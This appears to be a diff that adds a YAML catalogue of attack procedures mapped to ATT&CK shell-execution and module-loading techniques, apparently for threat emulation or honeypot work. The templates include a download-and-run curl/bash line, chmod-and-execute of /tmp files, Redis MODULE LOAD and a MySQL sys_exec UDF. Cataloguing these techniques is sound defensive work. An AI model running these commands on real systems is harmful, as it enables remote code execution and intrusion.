@@ -1,0 +1,58 @@
+# Shell execution and shared-module loading: written for the Phase 2 catalogue (spec 2.1).
+attack_version: "20.1"
+procedures:
+  - id: exec-nohup-relay
+    technique: T1059.004
+    tactic: TA0002
+    source: corpus
+    protocol: ssh
+    template: nohup /tmp/{{file}} {{host}} {{host2}} &
+  - id: exec-bash-c
+    technique: T1059.004
+    tactic: TA0002
+    source: own
+    protocol: ssh
+    template: bash -c 'uname -r; date'
+  - id: exec-download-bash
+    technique: T1059.004
+    tactic: TA0002
+    source: atomic
+    protocol: ssh
+    template: curl -sO {{url}}; bash {{file}}
+    ref: ART T1105 test 10 Linux Download File and Run (bdc373c5-e9cf-4563-8a7b-a9ba720a90f3)
+  - id: exec-echo-escape
+    technique: T1059.004
+    tactic: TA0002
+    source: corpus
+    protocol: ssh
+    template: echo -e "\x6F\x6B"
+  - id: exec-chmod-run
+    technique: T1059.004
+    tactic: TA0002
+    source: corpus
+    protocol: ssh
+    template: chmod 777 /tmp/{{file}}; sh /tmp/{{file}}
+  - id: module-redis-load
+    technique: T1129
+    tactic: TA0002
+    source: own
+    protocol: redis
+    template: MODULE LOAD /tmp/{{file}}.so
+  - id: module-mysql-udf
+    technique: T1129
+    tactic: TA0002
+    source: own
+    protocol: mysql
+    template: CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '{{file}}.so'
+  - id: module-link-lib
+    technique: T1129
+    tactic: TA0002
+    source: own
+    protocol: ssh
+    template: ln -s /lib/x86_64-linux-gnu/libc.so.6 /tmp/{{file}}.so
+  - id: module-ldd-list
+    technique: T1129
+    tactic: TA0002
+    source: own
+    protocol: ssh
+    template: ldd /bin/ls
